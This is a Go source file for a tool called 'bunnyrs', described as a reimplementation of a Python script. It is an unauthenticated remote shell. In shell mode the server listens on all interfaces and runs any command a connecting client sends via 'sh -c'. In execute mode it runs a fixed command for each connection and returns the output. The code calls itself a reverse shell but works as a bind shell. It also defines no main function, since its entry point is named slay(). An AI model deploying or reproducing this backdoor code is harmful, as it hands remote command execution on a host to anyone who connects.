package main

import (
	"bufio"
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"os/exec"
	"os/signal"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"
)

// This file is a Go reimplementation of bunnyrs.py placed into bunnyrs/test.py
// It implements a simple client/server reverse shell utility with two server
// profiles: execute (run a command and send output) and shell (interactive reverse shell).
//
// Usage (examples):
//   Server execute: bunnyrs -s -e "ls -la" -p 9000
//   Server shell:   bunnyrs -s -sh -p 9000
//   Client:         bunnyrs -t 127.0.0.1 -p 9000
//
// Flags mirror the python original:
//   -s            --server
//   -sh           --shell   (server profile)
//   -e <command>  --execute (server profile)
//   -t <target>   --target  (client mode)
//   -p <port>     --port    (required)

const (
	AnsiPink    = "\033[38;5;219m"
	AnsiBlue    = "\033[96m"
	AnsiGreen   = "\033[38;5;151m"
	AnsiOrange  = "\033[38;5;215m"
	AnsiRed     = "\033[91m"
	AnsiReset   = "\033[0m"
	BufSizeRecv = 4096
)

func colorPrint(color, msg string) {
	fmt.Print(color + msg + AnsiReset)
}

func colorPrintln(color, msg string) {
	fmt.Println(color + msg + AnsiReset)
}

func recvAll(conn net.Conn, bufsize int) ([]byte, error) {
	// Similar semantics to the Python recv helper:
	// read repeatedly until Read returns less than bufsize or EOF.
	var res bytes.Buffer
	tmp := make([]byte, bufsize)
	for {
		n, err := conn.Read(tmp)
		if n > 0 {
			res.Write(tmp[:n])
		}
		if err != nil {
			if err == io.EOF {
				// If we received nothing, return empty slice and nil error
				if res.Len() == 0 {
					return []byte{}, nil
				}
				return res.Bytes(), nil
			}
			return nil, err
		}
		if n < bufsize {
			break
		}
	}
	return res.Bytes(), nil
}

func closeConn(conn net.Conn) {
	if conn == nil {
		return
	}
	// attempt to shutdown by setting deadline then close
	_ = conn.SetReadDeadline(time.Now().Add(50 * time.Millisecond))
	_ = conn.SetWriteDeadline(time.Now().Add(50 * time.Millisecond))
	_ = conn.Close()
}

func executeCommand(cmd string) (string, string, error) {
	cmd = strings.TrimSpace(cmd)
	if cmd == "" {
		return "", "", fmt.Errorf("cmd is empty")
	}
	// run via sh -c to match shell=True behavior
	c := exec.Command("sh", "-c", cmd)
	var stdout, stderr bytes.Buffer
	c.Stdout = &stdout
	c.Stderr = &stderr
	err := c.Run()
	return stdout.String(), stderr.String(), err
}

type BunnyrsClient struct {
	target string
	port   int
	conn   net.Conn
}

func NewBunnyrsClient(target string, port int) *BunnyrsClient {
	return &BunnyrsClient{target: target, port: port}
}

func (c *BunnyrsClient) Run(ctx context.Context) {
	addr := net.JoinHostPort(c.target, strconv.Itoa(c.port))
	conn, err := net.Dial("tcp", addr)
	if err != nil {
		// mimic python behavior for connection errors
		if opErr, ok := err.(*net.OpError); ok && opErr.Err != nil {
			colorPrintln(AnsiRed, fmt.Sprintf("Couldn't connect to %s:%d", c.target, c.port))
		} else {
			colorPrintln(AnsiRed, fmt.Sprintf("Connection error: %v", err))
		}
		os.Exit(1)
	}
	c.conn = conn
	defer closeConn(c.conn)

	// interactive loop
	first := true
	stdinReader := bufio.NewReader(os.Stdin)

	for {
		// attempt to receive a response from server
		response, err := recvAll(c.conn, BufSizeRecv)
		if err != nil {
			colorPrintln(AnsiRed, fmt.Sprintf("Receive error: %v", err))
			return
		}
		if len(response) == 0 {
			colorPrintln(AnsiRed, "Disconnected from target")
			closeConn(c.conn)
			return
		}
		respStr := string(response)
		if first {
			// print first message with special pink formatting similar to original:
			// they printed first message in pink and inserted a RESET after the first newline.
			// We'll approximate by printing the first line in pink then the rest normally.
			idx := strings.Index(respStr, "\n")
			if idx == -1 {
				colorPrintln(AnsiPink, respStr)
			} else {
				colorPrintln(AnsiPink, respStr[:idx+1])
				fmt.Print(respStr[idx+1:])
			}
			first = false
		} else {
			fmt.Print(respStr)
		}

		// prompt
		fmt.Print(AnsiPink + "> " + AnsiReset)
		text, err := stdinReader.ReadString('\n')
		if err != nil {
			// If we get an interrupt or EOF, terminate gracefully
			colorPrintln(AnsiRed, "\nClient terminated.")
			return
		}
		// emulate python input() which strips trailing newline
		text = strings.TrimSuffix(text, "\n")
		_, err = c.conn.Write([]byte(text))
		if err != nil {
			colorPrintln(AnsiRed, fmt.Sprintf("Send error: %v", err))
			return
		}

		// if context is canceled (SIGINT), exit
		select {
		case <-ctx.Done():
			colorPrintln(AnsiRed, "\nClient terminated.")
			return
		default:
		}
	}
}

type BunnyrsServer struct {
	port         int
	executeCmd   string
	shellMode    bool
	listener     net.Listener
	clients      []net.Conn
	clientsMutex sync.Mutex
	shutdownCtx  context.Context
	shutdownFunc context.CancelFunc
	runningUser  string
	wg           sync.WaitGroup
}

func NewBunnyrsServer(port int, shellMode bool, executeCmd string) *BunnyrsServer {
	ctx, cancel := context.WithCancel(context.Background())
	return &BunnyrsServer{
		port:         port,
		executeCmd:   executeCmd,
		shellMode:    shellMode,
		shutdownCtx:  ctx,
		shutdownFunc: cancel,
		clients:      make([]net.Conn, 0),
	}
}

func (s *BunnyrsServer) whoami() string {
	stdout, _, err := executeCommand("whoami")
	if err != nil {
		// fallback to environment or unknown
		if u := os.Getenv("USER"); u != "" {
			return u
		}
		return "unknown"
	}
	return strings.TrimSpace(stdout)
}

func (s *BunnyrsServer) Shutdown() {
	// inform goroutines to stop
	s.shutdownFunc()
	// close clients
	s.clientsMutex.Lock()
	for _, c := range s.clients {
		closeConn(c)
	}
	s.clients = nil
	s.clientsMutex.Unlock()
	// close listener
	if s.listener != nil {
		_ = s.listener.Close()
	}
	colorPrintln(AnsiRed, "\nServer terminated")
}

func (s *BunnyrsServer) Run() {
	addr := net.JoinHostPort("0.0.0.0", strconv.Itoa(s.port))
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		// handle port in use
		if strings.Contains(err.Error(), "address already in use") {
			colorPrintln(AnsiRed, fmt.Sprintf("%s:%d already in use", "0.0.0.0", s.port))
		} else {
			colorPrintln(AnsiRed, fmt.Sprintf("Bind error: %v", err))
		}
		os.Exit(1)
	}
	s.listener = ln
	s.runningUser = s.whoami()

	// accept loop
	for {
		select {
		case <-s.shutdownCtx.Done():
			s.Shutdown()
			return
		default:
		}
		ln.(*net.TCPListener).SetDeadline(time.Now().Add(500 * time.Millisecond))
		conn, err := ln.Accept()
		if err != nil {
			// timeout for deadline is normal; continue to check shutdown
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				continue
			}
			// if listener closed, exit
			select {
			case <-s.shutdownCtx.Done():
				s.Shutdown()
				return
			default:
				colorPrintln(AnsiRed, fmt.Sprintf("Accept error: %v", err))
				continue
			}
		}
		s.clientsMutex.Lock()
		s.clients = append(s.clients, conn)
		s.clientsMutex.Unlock()
		s.wg.Add(1)
		go func(c net.Conn, addr net.Addr) {
			defer s.wg.Done()
			s.handleClient(c, addr)
		}(conn, conn.RemoteAddr())
	}
}

func (s *BunnyrsServer) handleClient(conn net.Conn, addr net.Addr) {
	colorPrintln(AnsiGreen, fmt.Sprintf("%s connected", addr.String()))
	if s.executeCmd != "" {
		s.handleExecute(conn, addr)
	} else if s.shellMode {
		s.handleCommandShell(conn, addr)
	} else {
		// nothing to do; close
		closeConn(conn)
	}
	// remove from clients list
	s.clientsMutex.Lock()
	for i, c := range s.clients {
		if c == conn {
			// remove
			s.clients = append(s.clients[:i], s.clients[i+1:]...)
			break
		}
	}
	s.clientsMutex.Unlock()
}

func (s *BunnyrsServer) handleExecute(conn net.Conn, addr net.Addr) {
	header := "<# Execute #>"
	stdout, stderr, _ := executeCommand(s.executeCmd)
	payload := fmt.Sprintf("%s\n\n%s\n%s", header, stdout, stderr)
	_, _ = conn.Write([]byte(payload))
	closeConn(conn)
	colorPrintln(AnsiRed, fmt.Sprintf("%s disconnected", addr.String()))
}

func (s *BunnyrsServer) handleCommandShell(conn net.Conn, addr net.Addr) {
	header := fmt.Sprintf("<# Reverse shell as %s #> ", s.runningUser)
	_, _ = conn.Write([]byte(header))
	buf := make([]byte, 64)
	for {
		// respect shutdown
		select {
		case <-s.shutdownCtx.Done():
			closeConn(conn)
			return
		default:
		}
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil {
			if ne, ok := err.(net.Error); ok && ne.Timeout() {
				// continue and re-check shutdown
				continue
			}
			// remote closed or other error
			closeConn(conn)
			colorPrintln(AnsiRed, fmt.Sprintf("%s disconnected", addr.String()))
			return
		}
		if n == 0 {
			closeConn(conn)
			colorPrintln(AnsiRed, fmt.Sprintf("%s disconnected", addr.String()))
			return
		}
		commandStr := string(buf[:n])
		commandStr = strings.TrimSpace(commandStr)
		var response string
		if strings.Contains(commandStr, "sudo") {
			response = "Sudo not supported"
		} else {
			stdout, stderr, err := executeCommand(commandStr)
			if err != nil {
				// If there was an execution error, include it in response
				response = fmt.Sprintf("%s\n%s\n%v", stdout, stderr, err)
			} else {
				colorPrintln(AnsiBlue, fmt.Sprintf("%s executed %s", addr.String(), commandStr))
				response = fmt.Sprintf("%s\n%s", stdout, stderr)
			}
		}
		_, _ = conn.Write([]byte(response))
	}
}

func checkTargetArg(val string) (string, error) {
	if val == "" {
		return "", fmt.Errorf("target is not an IPv4 address")
	}
	parts := strings.Split(val, ".")
	if len(parts) != 4 {
		return "", fmt.Errorf("target is not an IPv4 address")
	}
	for _, p := range parts {
		n, err := strconv.Atoi(p)
		if err != nil || n < 0 || n > 255 {
			return "", fmt.Errorf("target is not an IPv4 address")
		}
	}
	return val, nil
}

func slay() {
	// flag definitions
	server := flag.Bool("s", false, "Server mode")
	shell := flag.Bool("sh", false, "Server profile: Reverse Shell")
	execute := flag.String("e", "", "Server profile: Execute - command to run on connect")
	target := flag.String("t", "", "Target IPv4 address")
	port := flag.Int("p", 0, "Port number (required)")
	flag.Parse()

	// validate flags like the Python original
	if *server && *target != "" {
		colorPrintln(AnsiRed, "Can't set a target in Server mode")
		os.Exit(1)
	}
	if *server && !*shell && *execute == "" {
		colorPrintln(AnsiRed, "Server mode needs a profile: either --shell (-sh) or --execute (-e)")
		os.Exit(1)
	}
	if !*server && (*target == "" || *port == 0) {
		colorPrintln(AnsiRed, "Client mode needs a target (--target (-t) and --port (-p))")
		os.Exit(1)
	}
	if !*server && (*shell || *execute != "") {
		colorPrintln(AnsiRed, "Can't set --shell (-sh) or --execute (-e) in Client mode")
		os.Exit(1)
	}
	// additional validations
	if *execute != "" && strings.TrimSpace(*execute) == "" {
		colorPrintln(AnsiRed, "command is empty")
		os.Exit(1)
	}
	if *port < 0 || *port > 65535 {
		colorPrintln(AnsiRed, "port should be between 0 and 65535")
		os.Exit(1)
	}
	if *target != "" {
		if _, err := checkTargetArg(*target); err != nil {
			colorPrintln(AnsiRed, "target is not an IPv4 address")
			os.Exit(1)
		}
	}

	// banner
	fmt.Println("\n. ݁₊ ⊹ . ݁ bunnyrs (\\_/) ⟡ ݁ . ⊹ ₊ ݁.\n")

	// Setup signal handling for graceful shutdown (SIGINT)
	ctx, stop := signal.NotifyContext(context.Background(), syscall.SIGINT, syscall.SIGTERM)
	defer stop()

	if *server {
		srv := NewBunnyrsServer(*port, *shell, *execute)
		// run server in separate goroutine so we can listen for signals
		go srv.Run()
		// wait for shutdown signal
		<-ctx.Done()
		srv.Shutdown()
		// wait for goroutines to finish if any
		srv.wg.Wait()
	} else {
		// client
		cl := NewBunnyrsClient(*target, *port)
		cl.Run(ctx)
	}
}
